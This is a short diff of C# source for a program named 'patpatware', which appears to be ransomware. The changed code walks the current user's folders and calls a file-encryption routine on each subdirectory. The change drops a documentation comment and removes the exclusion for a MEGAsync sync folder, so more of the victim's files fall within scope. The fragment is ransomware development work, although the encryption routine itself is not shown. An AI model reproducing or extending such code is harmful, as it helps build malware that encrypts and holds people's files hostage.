@@ -10,10 +10,7 @@ namespace patpatware
 {
     static class Program
     {
-        /// <summary>
-        /// The main entry point for the application.
-        /// </summary>
-        /// 
+
         private static byte[] key = generatekey();
         public static string currentUser = Environment.UserName;
 
@@ -61,7 +58,7 @@ namespace patpatware
 
                     Console.WriteLine(chLastDir.ToString());
 
-                    if (subDir != @"C:\Users\" + currentUser + @"\AppData" && subDir != @"C:\Users\" + currentUser + @"\Documents\MEGAsync" && chLastDir.ToString() != "patpatware")
+                    if (subDir != @"C:\Users\" + currentUser + @"\AppData" && chLastDir.ToString() != "patpatware")
                     {
                         scanFilesForEncryption(subDir);
                     }
